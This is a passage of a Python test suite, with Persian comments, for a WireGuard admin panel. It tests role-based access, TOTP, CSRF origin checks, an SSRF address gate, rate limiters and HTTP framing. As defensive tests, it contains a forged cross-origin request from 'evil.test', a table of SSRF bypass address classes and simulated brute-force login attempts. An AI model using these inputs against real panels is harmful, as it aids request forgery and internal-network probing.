    TLS و جدولِ نقش‌ها را دارد. ۲۵ نقطه‌ی فراخوانی از نخ‌های HTTP و نخِ
    ربات می‌نویسند.
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-save-")
        self.m = load_module(self.tmp)
        self.m.CONFIG = {
            "users": [{"username": "admin", "salt": "a" * 32, "hash": "h",
                       "role": "admin"}],
        }

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_save_config_survives_concurrent_writers(self):
        """چند نویسنده‌ی هم‌زمان نباید config.json را درهم بنویسند.

        پیش از این همه CONFIG_PATH + ".tmp" را با O_TRUNC باز می‌کردند و
        در آفست‌های مستقل می‌نوشتند؛ نتیجه می‌توانست JSON ِ نامعتبر باشد
        و load_config در استارتِ بعدی می‌افتاد — و گاردِ ضدِ بازنویسی
        بازیابی را دستی می‌کرد.
        """
        m = self.m
        m.CONFIG["pad"] = "x" * 200_000     # پنجره‌ی نوشتن را باز نگه می‌دارد
        errs = []

        def writer():
            try:
                for _ in range(20):
                    m.save_config()
            except Exception as e:          # noqa: BLE001 — هر خطایی شکست است
                errs.append(e)

        ts = [threading.Thread(target=writer) for _ in range(4)]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        self.assertEqual(errs, [], "نوشتنِ هم‌زمان خطا داد: %r" % (errs[:1],))
        with open(m.CONFIG_PATH, encoding="utf-8") as fh:
            data = json.load(fh)            # باید همیشه JSON ِ معتبر باشد
        self.assertEqual(len(data.get("pad", "")), 200_000)

    def test_no_temp_files_are_left_behind(self):
        """هیچ فایلِ موقتی نباید در پوشه‌ی کانفیگ جا بماند."""
        m = self.m
        for _ in range(5):
            m.save_config()
        leftovers = [f for f in os.listdir(self.tmp) if f.endswith(".tmp")]
        self.assertEqual(leftovers, [], "فایلِ موقتِ جامانده: %s" % leftovers)

    def test_config_file_is_not_world_readable(self):
        """مودِ ۰۶۰۰ باید حفظ شود — فایل هشِ رمزها و secret را دارد."""
        m = self.m
        m.save_config()
        self.assertEqual(os.stat(m.CONFIG_PATH).st_mode & 0o777, 0o600)

    def test_the_unpopulated_guard_still_refuses(self):
        """گاردِ ضدِ بازنویسیِ فاجعه‌بار نباید با افزودنِ قفل از بین برود."""
        m = self.m
        m.CONFIG = {}
        with self.assertRaises(RuntimeError):
            m.save_config()

    def test_a_failed_serialization_leaves_the_config_intact(self):
        """اگر json.dump شکست بخورد، فایلِ قبلی باید دست‌نخورده بماند."""
        m = self.m
        m.save_config()
        before = pathlib.Path(m.CONFIG_PATH).read_text(encoding="utf-8")

        class Unserializable:
            pass

        m.CONFIG["bad"] = Unserializable()
        with self.assertRaises(TypeError):
            m.save_config()
        self.assertEqual(
            pathlib.Path(m.CONFIG_PATH).read_text(encoding="utf-8"), before)
        self.assertEqual([f for f in os.listdir(self.tmp) if ".tmp" in f], [],
                         "شکستِ سریال‌سازی فایلِ موقت جا گذاشت")


class RequestLevelTests(unittest.TestCase):
    """اجرای واقعیِ گیتِ RBAC و گام‌های پیش‌گیتِ do_POST.

    تا پیش از این هیچ تستی _perm_denied را اجرا نمی‌کرد: تنها
    test_required_perm بود که یک خواندنِ دیکشنری را می‌سنجید. یعنی
    «جدول درست است» آزموده می‌شد و «هندلر جدول را می‌خوانَد» نه — در
    تابعی که حالتِ خرابی‌اش «هر viewer ِ واردشده می‌تواند پیر حذف کند»
    است.

    ⚠️ آنچه این کلاس **پوشش نمی‌دهد** (عمدی — پلنِ ۰۲۴):
      • سوکتِ واقعی، فریم‌بندی، Content-Length
      • امضا و تأییدِ کوکیِ نشست (_session جایگزین می‌شود)
      • TLS
    پلن‌های ۰۲۴/۰۳۱/۰۳۵/۰۳۸/۰۴۱/۰۶۲/۰۶۳ روی همین کلاس می‌سازند؛
    موردِ تازه را اینجا اضافه کنید نه در هارنسِ موازی.
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-req-")
        self.m = load_module(self.tmp)
        self.m.CONFIG["users"] = [
            {"username": "admin", "salt": "a" * 32, "hash": "h",
             "role": "admin", "totp": "T" * 16, "stoken": "s1"},
            {"username": "viewer", "salt": "b" * 32, "hash": "h",
             "role": "viewer", "totp": "T" * 16, "stoken": "s2"},
        ]

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _h(self, **kw):
        return make_fake_handler(self.m, **kw)

    @staticmethod
    def _code(h):
        return dict(h.sent).get("__code__")

    # ---- ۱) بدونِ نشست --------------------------------------------------
    def test_no_session_is_401(self):
        """درخواستِ بدونِ نشست باید ۴۰۱ بگیرد، نه ۴۰۳ و نه عبور."""
        h = self._h(path="/api/peer/delete", session=None)
        self.assertTrue(h._perm_denied("/api/peer/delete"))
        self.assertEqual(self._code(h), 401)

    # ---- ۲) مجوزِ ناکافی ------------------------------------------------
    def test_viewer_cannot_delete_a_peer(self):
        h = self._h(path="/api/peer/delete",
                    session={"u": "viewer", "r": "viewer"})
        self.assertTrue(h._perm_denied("/api/peer/delete"),
                        "viewer نباید wg.del بگیرد")
        self.assertEqual(self._code(h), 403)

    def test_admin_may_delete_a_peer(self):
        h = self._h(path="/api/peer/delete",
                    session={"u": "admin", "r": "admin"})
        self.assertFalse(h._perm_denied("/api/peer/delete"))
        self.assertIsNone(self._code(h), "گیت نباید چیزی فرستاده باشد")

    def test_viewer_keeps_its_read_permissions(self):
        """گارد نباید آن‌قدر سفت شود که viewer دیدِ خودش را از دست بدهد.

        جهتِ دومِ گارد: تستِ بالا ثابت می‌کند viewer نمی‌تواند حذف کند،
        این ثابت می‌کند هنوز می‌تواند ببیند. بدونِ این، «همه را رد کن»
        هم سبز می‌شد.
        """
        m = self.m
        for path in ("/api/usage", "/api/warp/latency", "/api/net/leak-audit",
                     "/api/sys/series"):
            need = m.Handler.required_perm(path)
            self.assertIn(need, m.VIEWER_PERMS,
                          "فرضِ تست غلط شد: %s دیگر مجوزِ viewer نیست" % path)
            h = self._h(path=path, session={"u": "viewer", "r": "viewer"})
            with self.subTest(path=path):
                self.assertFalse(h._perm_denied(path),
                                 "viewer نباید از %s رد شود" % path)
                self.assertIsNone(self._code(h))

    # ---- ۲٫۵) زبانِ پیامِ خطا (پلنِ ۰۶۵) --------------------------------
    def _err_body(self, lang, obj):
        """`obj` را از گلوگاهِ واقعیِ `_json` رد می‌کند و متنِ خطا را می‌دهد.

        تستِ واحدِ `t()` کافی نیست: چیزی که ممکن است بشکند خودِ **مسیر**
        است — `_lang()` ← `_msg()` ← `t()`. این‌جا همان مسیر با کوکیِ
        واقعیِ زبان اجرا می‌شود.
        """
        h = self._h(path="/api/roles/save", method="POST",
                    headers={"Cookie": "wgl=%s" % lang},
                    session={"u": "admin", "r": "admin"})
        h._json(obj)
        return json.loads(b"".join(h.body).decode("utf-8"))["error"]

    def test_a_plain_error_key_follows_the_request_language(self):
        """پیامِ خطا باید به زبانِ درخواست بیاید، نه فارسیِ ثابت.

        رابط چهارزبانه است ولی پاسخِ APIها فارسی مانده بود: کاربرِ
        انگلیسی رابطِ کاملاً ترجمه‌شده می‌گرفت و هر شکست را فارسی —
        دقیقاً وقتی گیر کرده و باید پیام را بخواند.
        """
        for lang, needle in (("fa", "نقش"), ("en", "role"),
                             ("ru", "рол"), ("zh", "角色")):
            with self.subTest(lang=lang):
                txt = self._err_body(lang, {"ok": False,
                                            "error": "api.err.role.notfound"})
                # مقایسه بی‌حساسیت به بزرگی/کوچکی: «Role»/«Роль» با حرفِ
                # بزرگ شروع می‌شوند و نیازه‌ی کوچک وگرنه بی‌دلیل رد می‌شد.
                self.assertIn(needle.lower(), txt.lower())

    def test_a_parameterized_error_keeps_its_value_in_every_language(self):
        """`aerr` باید مقدار را در هر چهار زبان نشان دهد.

        `t()` جای‌گیرِ ناجور را می‌بلعد، پس ناهم‌خوانیِ کلید و پارامتر
        پیامی می‌دهد که «{perm}» خام در آن است — بدونِ هیچ خطایی.
        """
        for lang in self.m.LANGS:
            with self.subTest(lang=lang):
                txt = self._err_body(
                    lang, {"ok": False,
                           "error": self.m.aerr("api.err.role.unknown_perm",
                                                perm="wg.zzz")})
                self.assertIn("wg.zzz", txt, "مقدارِ پارامتر گم شد")
                self.assertNotIn("{perm}", txt, "جای‌گیر جایگزین نشد")

    def test_a_system_message_passes_through_untranslated(self):
        """پیامِ خامِ سیستم (خروجیِ wg، متنِ OS) نباید دست بخورد.

        همین ویژگیِ `_msg` است که تبدیلِ مرحله‌ای را ممکن می‌کند: هر
        چیزی که کلید نباشد بی‌تغییر رد می‌شود.
        """
        raw = "Unable to access interface: No such device"
        self.assertEqual(self._err_body("en", {"ok": False, "error": raw}), raw)

    # ---- ۳) endpoint ِ بدونِ نگاشت ⇒ فقط admin --------------------------
    def test_unmapped_api_path_defaults_to_admin_only(self):
        """روتِ /api/ ِ تازه‌ای که در PERM_MAP نیست باید فقط admin باشد.

        این پیش‌فرضِ امن است و دقیقاً همان چیزی که یک بازآراییِ do_POST
        بی‌صدا حذفش می‌کند. هر روتِ تازه بدونِ ردیفِ PERM_MAP روی همین
        شاخه می‌افتد.
        """
        novel = "/api/this/route/does/not/exist/yet"
        self.assertIsNone(self.m.Handler.required_perm(novel),
                          "فرضِ تست غلط شد: این مسیر نگاشت دارد")
        hv = self._h(path=novel, session={"u": "viewer", "r": "viewer"})
        self.assertTrue(hv._perm_denied(novel),
                        "viewer روی روتِ بدونِ نگاشت رد نشد")
        self.assertEqual(self._code(hv), 403)
        ha = self._h(path=novel, session={"u": "admin", "r": "admin"})
        self.assertFalse(ha._perm_denied(novel))

    def test_non_api_paths_are_not_gated(self):
        """مسیرِ غیر-/api/ (صفحه، استاتیک) نباید پشتِ گیت بیفتد."""
        h = self._h(path="/", session={"u": "viewer", "r": "viewer"})
        self.assertFalse(h._perm_denied("/"))

    # ---- ۴) اجبارِ TOTP --------------------------------------------------
    def test_totp_required_blocks_everything_but_setup_paths(self):
        """نقشی که TOTP را الزامی کرده ولی کاربر فعالش نکرده: فقط
        مسیرهای راه‌اندازی باز بمانند."""
        m = self.m
        m.CONFIG["roles"] = {"viewer": {"perms": sorted(m.VIEWER_PERMS),
                                        "require_totp": True}}
        m.CONFIG["users"][1]["totp"] = ""          # هنوز ست نکرده
        u = m.find_user("viewer")
        if not m.user_needs_totp(u):
            self.skipTest("این پیکربندی TOTP را اجباری نمی‌کند — "
                          "فرضِ تست برقرار نیست")
        h = self._h(path="/api/peer/delete",
                    session={"u": "viewer", "r": "viewer"})
        self.assertTrue(h._perm_denied("/api/peer/delete"))
        self.assertEqual(self._code(h), 403)
        for p in m.Handler.TOTP_SETUP_PATHS:
            h2 = self._h(path=p, session={"u": "viewer", "r": "viewer"})
            with self.subTest(path=p):
                self.assertFalse(h2._perm_denied(p),
                                 "مسیرِ راه‌اندازیِ TOTP نباید بسته باشد")

    # ---- do_POST: گام‌های پیش از گیت ------------------------------------
    def test_post_rejects_cross_origin(self):
        """دفاعِ دومِ CSRF: Origin ِ ناهم‌خوان با Host باید ۴۰۳ بگیرد."""
        h = self._h(path="/api/peer/add", method="POST", body={"x": 1},
                    headers={"Origin": "https://evil.test",
                             "Host": "panel.test"},
                    session={"u": "admin", "r": "admin"})
        h.do_POST()
        self.assertEqual(self._code(h), 403)
        self.assertIn("bad origin", b"".join(h.body).decode())

    def test_post_allows_same_origin(self):
        """Origin ِ هم‌خوان نباید با «bad origin» رد شود."""
        h = self._h(path="/api/peer/add", method="POST",
                    body={"iface": "wgtest", "name": ""},
                    headers={"Origin": "https://panel.test",
                             "Host": "panel.test"},
                    session={"u": "admin", "r": "admin"})
        h.do_POST()
        self.assertNotIn("bad origin", b"".join(h.body).decode())

    def test_post_without_origin_is_allowed(self):
        """نبودِ Origin (کلاینتِ غیرمرورگر) نباید ۴۰۳ بگیرد —
        SameSite=Strict دفاعِ اول است و این دفاعِ دوم شرطی است."""
        h = self._h(path="/api/peer/add", method="POST",
                    body={"iface": "wgtest", "name": ""},
                    session={"u": "admin", "r": "admin"})
        h.do_POST()
        self.assertNotIn("bad origin", b"".join(h.body).decode())

    def test_post_denies_a_disallowed_ip_before_anything_else(self):
        """گاردِ IP باید پیش از CSRF و پیش از گیتِ مجوز اجرا شود."""
        m = self.m
        m.CONFIG["allow_ips"] = ["203.0.113.7"]
        h = self._h(path="/api/peer/add", method="POST", body={"x": 1},
                    headers={"Origin": "https://evil.test"},
                    session={"u": "admin", "r": "admin"},
                    client_ip="203.0.113.9")
        h.do_POST()
        self.assertEqual(self._code(h), 403)
        self.assertNotIn("bad origin", b"".join(h.body).decode(),
                         "گاردِ IP باید زودتر از بررسیِ Origin برسد")

    def test_restore_needs_the_protected_admin(self):
        """/api/restore حتی برای ادمینِ دیگر هم بسته است.

        دلیلش در خودِ کد نوشته شده: بازیابی می‌تواند peerها را به گذشته
        برگرداند و ردِ خرابکاری را پاک کند.
        """
        m = self.m
        m.CONFIG["users"].append(
            {"username": "admin2", "salt": "c" * 32, "hash": "h",
             "role": "admin", "totp": "T" * 16, "stoken": "s3"})
        h = self._h(path="/api/restore", method="POST", body=b"x",
                    session={"u": "admin2", "r": "admin"})
        h.do_POST()
        self.assertEqual(self._code(h), 403)


class InlineJsScopeTests(unittest.TestCase):
    """~۷٬۴۰۰ خطِ JS در یک اسکوپِ تختِ سراسری زندگی می‌کند."""

    # سه ظرفِ رشته‌ایِ JS/HTML — همان تقسیمی که extract-inline-js.py (گامِ ۳
    # باتری) می‌شناسد. هر ظرف سندی جداست، پس اسکوپِ سراسریِ خودش را دارد و
    # هم‌نامیِ **بینِ** ظرف‌ها برخورد نیست: `_t` عمداً هم در SHARE_HTML هست
    # هم در PAGE_HTML. برخورد فقط **درونِ** یک ظرف معنا دارد.
    CONTAINERS = ("PAGE_HTML", "TV3D_JS", "SHARE_HTML")

    def test_no_duplicate_toplevel_function_in_inline_js(self):
        """هیچ تابعِ سراسری نباید درونِ یک ظرف دو بار تعریف شود.

        تعریفِ تابع hoist می‌شود و آخرین تعریف برنده است، پس تعریفِ دوم
        بی‌صدا اولی را می‌پوشاند: roleLabel این‌طور باعث شد هدرِ پنل
        «admin (ui.role.admin)» — یعنی کلیدِ خامِ ترجمه — چاپ کند.
        node --check این را نمی‌گیرد چون redeclaration نحواً مجاز است.
        """
        import collections
        src = _read_panel_source()
        for name in self.CONTAINERS:
            m = re.search(r'^%s = r"""(.*?)^"""' % name, src, re.S | re.M)
            self.assertIsNotNone(m, "ظرفِ %s پیدا نشد — ساختارِ فایل عوض شده؟" % name)
            # فقط تعریف‌های ستونِ صفر = سطحِ بالا؛ تابعِ تودرتو اسکوپِ خودش را دارد
            names = re.findall(r"^function\s+([A-Za-z_$][\w$]*)\s*\(",
                               m.group(1), re.M)
            dupes = {n: c for n, c in collections.Counter(names).items() if c > 1}
            with self.subTest(container=name):
                self.assertEqual(dupes, {},
                                 "تابعِ سراسریِ تکراری در %s: %s" % (name, dupes))


class GlobalIpGateTests(unittest.TestCase):
    """`_is_global_ip` گیتِ SSRF است: تصمیم می‌گیرد پنل به کدام نشانی
    mtr بزند، و مهم‌تر، دامنه‌ی سرویسِ سفارشی اصلاً پذیرفته شود یا نه."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-ssrf-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_is_global_ip_rejects_every_non_public_class(self):
        """گاردِ SSRF باید همه‌ی کلاس‌های غیرعمومی را رد کند.

        خانواده‌ی باگ «کلاسِ آدرسی که کسی به آن فکر نکرده» است، پس تست
        جدولی است نه تک‌موردی. دو جهت مهم‌اند: فهرستِ صفت‌ها به‌تنهایی
        CGNAT را رد نمی‌کرد، و is_global به‌تنهایی multicast و NAT64 را
        مجاز می‌کرد — پس هیچ‌کدام جای دیگری را نمی‌گیرد.
        """
        m = self.m
        deny = [
            ("192.168.1.1",     "RFC1918"),
            ("10.0.0.1",        "RFC1918"),
            ("172.16.0.1",      "RFC1918"),
            ("127.0.0.1",       "loopback"),
            ("169.254.1.1",     "link-local"),
            ("100.64.0.1",      "CGNAT RFC6598"),
            ("100.127.255.254", "CGNAT مرزِ بالا"),
            ("224.0.0.1",       "multicast"),
            ("239.255.255.250", "SSDP multicast"),
            ("0.0.0.0",         "unspecified"),
            ("255.255.255.255", "broadcast"),
            ("198.18.0.1",      "benchmarking RFC2544"),
            ("203.0.113.5",     "TEST-NET-3"),
            ("240.0.0.1",       "reserved"),
            ("::1",             "IPv6 loopback"),
            ("fe80::1",         "IPv6 link-local"),
            ("fc00::1",         "IPv6 ULA"),
            ("2001:db8::1",     "IPv6 documentation"),
            ("ff02::1",         "IPv6 multicast"),
            ("64:ff9b::7f00:1", "NAT64 → 127.0.0.1"),
            ("::ffff:127.0.0.1", "IPv4-mapped loopback"),
            ("::ffff:10.0.0.1", "IPv4-mapped RFC1918"),
            ("not-an-ip",       "ورودیِ نامعتبر"),
            ("",                "رشته‌ی خالی"),
        ]
        for ip, why in deny:
            with self.subTest(ip=ip, why=why):
                self.assertFalse(m._is_global_ip(ip),
                                 "%s (%s) نباید مجاز باشد" % (ip, why))

        allow = ["8.8.8.8", "1.1.1.1", "93.184.216.34",
                 "2001:4860:4860::8888", "::ffff:8.8.8.8"]
        for ip in allow:
            with self.subTest(ip=ip):
                self.assertTrue(m._is_global_ip(ip), "%s باید مجاز باشد" % ip)


class RateLimitTests(unittest.TestCase):
    """محدودکننده‌های نرخ — گاردِ جست‌وجوی رمز و گاردِ لینکِ اشتراک.

    هیچ‌کدام تست نداشتند. هر دو قفل دارند، هر دو حالتِ خودشان را هرس
    می‌کنند، و اولی هشدارِ حمله را هم می‌فرستد — تنها سیگنالی که
    اپراتور از حمله می‌گیرد.
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-rl-")
        self.m = load_module(self.tmp)
        self.m._login_attempts.clear()
        self.m._share_hits.clear()
        self.events = []
        self.m.ALERTS = types.SimpleNamespace(
            event=lambda kind, text: self.events.append((kind, text)))

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    # ── توصیفِ رفتارِ موجود ─────────────────────────────────────────────

    def test_login_allows_five_then_blocks(self):
        m = self.m
        ip = "203.0.113.7"
        for i in range(5):
            self.assertTrue(m.login_allowed(ip),
                            "تلاشِ %d باید مجاز باشد" % (i + 1))
            m.login_failed(ip)
        self.assertFalse(m.login_allowed(ip), "تلاشِ ششم باید بسته باشد")

    def test_login_limit_is_per_ip(self):
        m = self.m
        for _ in range(5):
            m.login_failed("203.0.113.7")
        self.assertFalse(m.login_allowed("203.0.113.7"))
        self.assertTrue(m.login_allowed("203.0.113.8"),
                        "IP ِ دیگر نباید تحتِ تأثیر باشد")

    def test_login_window_expires(self):
        """ورودی‌های کهنه‌تر از ۶۰ ثانیه باید کنار بروند.

        زمان تزریق می‌شود، نه اینکه تست ۶۱ ثانیه بخوابد.
        """
        m = self.m
        ip = "203.0.113.7"
        m._login_attempts[ip] = [time.time() - 61] * 10
        self.assertTrue(m.login_allowed(ip), "پنجره‌ی ۶۰ ثانیه پاک نشد")

    def test_share_allows_twenty_then_blocks(self):
        m = self.m
        ip = "203.0.113.9"
        for i in range(20):
            self.assertTrue(m.share_rate_ok(ip), "درخواستِ %d" % (i + 1))
        self.assertFalse(m.share_rate_ok(ip), "بیست‌ویکمی باید بسته باشد")

    def test_share_limiter_is_thread_safe(self):
        """۸ نخ × ۱۰ درخواست: دقیقاً ۲۰ تا باید مجاز شوند."""
        m = self.m
        ip, ok, lock = "203.0.113.10", [], threading.Lock()

        def hit():
            for _ in range(10):
                r = m.share_rate_ok(ip)
                with lock:
                    ok.append(r)
        ts = [threading.Thread(target=hit) for _ in range(8)]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        self.assertEqual(sum(ok), 20,
                         "شمارشِ مجازها زیرِ هم‌روندی درست نبود")

    def test_share_hits_dict_does_not_grow_without_bound(self):
        """کلیدهای IP در محدودکننده‌ی لینکِ اشتراک باید جارو شوند.

        فقط مهرهای زمانیِ داخلِ هر ورودی هرس می‌شد، نه خودِ کلیدها. ‏/s/
        بدونِ احراز هویت است، پس هر آدرسِ تازه یک ورودیِ دائمی می‌ساخت.
        محدودکننده‌ی خواهرش (login_failed) این سوییپ را از قبل داشت.
        """
        m = self.m
        m._share_hits.clear()
        old = time.time() - 7200          # کهنه‌تر از پنجره‌ی جاروی ۳۶۰۰
        for i in range(5000):
            m._share_hits["198.51.100.%d.%d" % (i % 256, i)] = [old]
        m.share_rate_ok("203.0.113.1")    # باید جارو را راه بیندازد
        self.assertLess(len(m._share_hits), 5000, "ورودی‌های کهنه جارو نشدند")
        self.assertIn("203.0.113.1", m._share_hits,
                      "ورودیِ تازه نباید جارو شود")

    def test_the_sweep_cannot_remove_the_entry_it_just_added(self):
        """سوییپ نباید همان ورودی‌ای را ببرد که همین حالا ساخت."""
        m = self.m
        m._share_hits.clear()
        old = time.time() - 7200
        for i in range(4200):
            m._share_hits["198.51.100.%d.%d" % (i % 256, i)] = [old]
        self.assertTrue(m.share_rate_ok("203.0.113.2"))
        self.assertEqual(len(m._share_hits["203.0.113.2"]), 1)

    def test_both_limiters_use_the_same_sweep_constants(self):
        """دو محدودکننده در یک فایل نباید آستانه‌های واگرا داشته باشند."""
        src = _read_panel_source()
        for fn in ("login_failed", "share_rate_ok"):
            seg = src[src.index("def %s(" % fn):][:1400]
            with self.subTest(fn=fn):
                self.assertIn("> 4096", seg, "%s آستانه‌ی ۴۰۹۶ ندارد" % fn)
                self.assertIn("> 3600", seg, "%s پنجره‌ی ۳۶۰۰ ندارد" % fn)

    # ── هشدارِ حمله ────────────────────────────────────────────────────

    def test_alert_fires_when_the_threshold_is_reached(self):
        m = self.m
        m.alert_cfg = lambda: {"login_fails": 3, "enabled": True}
        for _ in range(3):
            m.login_failed("203.0.113.11")
        self.assertEqual(len(self.events), 1, "هشدار دقیقاً یک بار نیامد")
        self.assertEqual(self.events[0][0], "login")

    def test_alert_does_not_repeat_on_every_further_failure(self):
        m = self.m
        m.alert_cfg = lambda: {"login_fails": 3, "enabled": True}
        for _ in range(10):
            m.login_failed("203.0.113.12")
        self.assertEqual(len(self.events), 1, "هشدار اسپم شد")

    def test_alert_still_fires_when_the_count_steps_over_the_threshold(self):
        """آستانه‌ی پایین‌آمده وسطِ حمله باید هشدار بدهد.

        پیش از این با `==` مقایسه می‌شد: شمارشِ ۱۳ هرگز با آستانه‌ی ۵
        برابر نمی‌شد و هشدار تا خالی‌شدنِ پنجره‌ی ۶۰۰ ثانیه نمی‌آمد —
        دقیقاً وقتی که اپراتور بیشترین نیاز را به سیگنال دارد، چون
        همان لحظه‌ای است که دارد آستانه را پایین می‌آورد.
        """
        m = self.m
        ip = "203.0.113.13"
        m.alert_cfg = lambda: {"login_fails": 10, "enabled": True}
        for _ in range(12):
            m.login_failed(ip)
        self.assertEqual(len(self.events), 1, "هشدار روی ۱۰ نیامد")
        self.events.clear()
        m.alert_cfg = lambda: {"login_fails": 5, "enabled": True}
        m.login_failed(ip)                      # recent10 حالا ۱۳
        self.assertEqual(len(self.events), 1, "هشدارِ آستانه‌ی جدید نیامد")

    def test_alert_state_is_reset_when_the_count_drops_below(self):
        """نشانه‌ی «هشدار رفت» باید با افتِ شمارش پاک شود.

        وگرنه IPای که یک بار حمله کرده دیگر هرگز هشدار نمی‌گیرد.
        """
        m = self.m
        m.alert_cfg = lambda: {"login_fails": 2, "enabled": True}
        ip = "203.0.113.14"
        for _ in range(2):
            m.login_failed(ip)
        self.assertEqual(len(self.events), 1)
        m._login_attempts[ip] = []              # پنجره خالی شد
        self.events.clear()
        for _ in range(2):
            m.login_failed(ip)
        self.assertEqual(len(self.events), 1, "حمله‌ی دوم هشدار نگرفت")

    def test_alert_state_is_pruned_with_the_attempt_state(self):
        """هرسِ حافظه باید حالتِ هشدار را هم ببرد.

        `_login_attempts` بالای ۴۰۹۶ ورودی هرس می‌شود؛ اگر نشانه‌ی
        هشدار همان‌جا پاک نشود، برای همیشه رشد می‌کند.
        """
        m = self.m
        m.alert_cfg = lambda: {"login_fails": 1, "enabled": True}
        old = time.time() - 7200                # کهنه‌تر از ۳۶۰۰
        for i in range(4100):
            m._login_attempts["198.51.100.%d" % i] = [old]
        m._login_alerted.update(
            {"198.51.100.%d" % i: 1 for i in range(4100)})
        m.login_failed("203.0.113.15")          # هرس را می‌اندازد
        self.assertLess(len(m._login_alerted), 4100,
                        "نشانه‌های هشدار همراهِ تلاش‌ها هرس نشدند")

    def test_alert_failure_never_breaks_the_limiter(self):
        """اگر ارسالِ هشدار استثنا بدهد، شمارنده نباید بشکند.

        محدودکننده گاردِ امنیتی است؛ خرابیِ کانالِ هشدار نباید
        بی‌صدا خاموشش کند.
        """
        m = self.m
        m.alert_cfg = lambda: {"login_fails": 1, "enabled": True}

        def boom(*a, **k):
            raise RuntimeError("کانالِ هشدار خراب است")
        m.ALERTS = types.SimpleNamespace(event=boom)
        ip = "203.0.113.16"
        for _ in range(5):
            m.login_failed(ip)                  # نباید استثنا بدهد
        self.assertFalse(m.login_allowed(ip), "شمارنده بعد از خطای هشدار نشمرد")


class HttpSmokeTests(unittest.TestCase):
    """سرورِ واقعی روی سوکت — لایه‌ای که هارنسِ ۰۱۹ عمداً جعل می‌کند.

    ۰۱۹ ‏`_session` و `headers` و `rfile` را استاب می‌کند؛ معامله‌ی
    درستی است برای آزمودنِ گیت، ولی یعنی چهار چیز نااثبات می‌ماند:
    چرخه‌ی کاملِ کوکی، هم‌خوانیِ Content-Length با بدنه، اینکه سرور
    اصلاً بالا می‌آید، و سرو شدنِ صفحه از سرِ تا ته.

    پوشش **نمی‌دهد**: TLS (عمداً خاموش تا فیکسچر ساده بماند).
    """

    def setUp(self):
        import http.server
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-http-")
        self.m = load_module(self.tmp)
        m = self.m
        m.CONFIG["tls_cert"] = ""          # TLS خاموش — پوششش اینجا نیست
        # SAMPLER ِ فیکسچر SimpleNamespace است و نیمی از متدهایی که
        # build_stats می‌خواهد را ندارد. چیزی که این کلاس می‌سنجد گیتِ
        # احراز هویت و لایه‌ی سوکت است، نه محتوای آمار — پس build_stats
        # جایگزین می‌شود (همان الگویی که این فایل جای دیگر هم دارد).
        #
        # 🪤 یافته‌ی جانبی: استثنای مهارنشده در یک روت، اتصال را **بی‌هیچ
        # پاسخی** می‌بندد — نه ۵۰۰. رفتارِ استانداردِ http.server است، ولی
        # یعنی مرورگرِ کاربر «اتصال قطع شد» می‌بیند نه خطای سرور.
        m.build_stats = lambda: {"peers": [], "ifaces": [], "sys": {}}
        # پورتِ ۰ = هر پورتِ آزادی که OS بدهد. پورتِ ثابت هم با اجرای
        # موازیِ تست‌ها تصادم می‌کند هم با پنلِ خودِ توسعه‌دهنده روی ۸۷۸۷.
        # کلاسِ **خودِ پنل**، نه ThreadingHTTPServer ِ استاندارد: مهلتِ
        # سوکت و صفِ pending در همان کلاس‌اند و با سرورِ عمومی سنجیده
        # نمی‌شوند. tls_context ست نمی‌شود ⇒ همان مسیرِ HTTP ِ ساده که
        # پیش‌فرضِ بسته‌های docker و airgap است.
        self.srv = m.TLSThreadingHTTPServer(("127.0.0.1", 0), m.Handler)
        self.port = self.srv.server_address[1]
        self.th = threading.Thread(target=self.srv.serve_forever, daemon=True)
        self.th.start()

    def tearDown(self):
        # try/finally تا شکستِ shutdown هم پوشه‌ی موقت را جا نگذارد؛ و
        # ادعای مردنِ نخ، چون serve_forever ِ نشت‌کرده اجرای **بعدی** را
        # مرموز می‌کند نه همین یکی را.
        try:
            self.srv.shutdown()
            self.srv.server_close()
            self.th.join(timeout=5)
            self.assertFalse(self.th.is_alive(), "نخِ سرور بسته نشد")
        finally:
            shutil.rmtree(self.tmp, ignore_errors=True)

    def _conn(self):
        import http.client
        return http.client.HTTPConnection("127.0.0.1", self.port, timeout=5)

    def test_content_length_matches_every_response_body(self):
        """طولِ اعلام‌شده باید با بدنه یکی باشد — روی هر مسیرِ نمونه.

        ناهم‌خوانی، فریمِ keep-alive را از هم می‌پاشد و درخواستِ بعدی
        روی همان اتصال هنگ می‌کند. دقیقاً ریسکی که پلنِ ۰۰۹
        (فشرده‌سازی) وارد کرد: بدنه فشرده شود و طول به‌روز نشود.
        """
        for path in ("/", "/tv3d.mjs", "/api/stats"):
            with self.subTest(path=path):
                c = self._conn()
                c.request("GET", path)
                r = c.getresponse()
                body = r.read()
                cl = r.getheader("Content-Length")
                c.close()
                self.assertIsNotNone(cl, "%s طولِ محتوا اعلام نمی‌کند" % path)
                self.assertEqual(int(cl), len(body),
                                 "%s: Content-Length با بدنه نمی‌خوانَد" % path)

    def test_content_length_matches_the_compressed_body(self):
        """و با Accept-Encoding: gzip هم — طولِ **فشرده** اعلام شود.

        این همان رگرسیونی است که پلنِ ۰۰۹ می‌توانست وارد کند و
        هیچ تستِ بی‌سوکتی نمی‌دیدش.
        """
        import gzip
        c = self._conn()
        c.request("GET", "/", headers={"Accept-Encoding": "gzip"})
        r = c.getresponse()
        body = r.read()
        enc = r.getheader("Content-Encoding")
        cl = r.getheader("Content-Length")
        c.close()
        self.assertEqual(int(cl), len(body),
                         "Content-Length با بدنه‌ی روی سیم نمی‌خوانَد")
        if enc == "gzip":
            gzip.decompress(body)      # باید بدونِ خطا باز شود

    def test_two_requests_on_one_connection(self):
        """دو درخواست روی یک اتصال — اثباتِ عملیِ درستیِ فریم.

        اگر طولِ اعلام‌شده غلط باشد، درخواستِ دوم یا هنگ می‌کند یا
        زباله می‌خواند. Content-Length می‌تواند در هر پاسخ با خودش
        سازگار باشد و باز هم غلط، اگر هندلر بایتِ اضافه بنویسد —
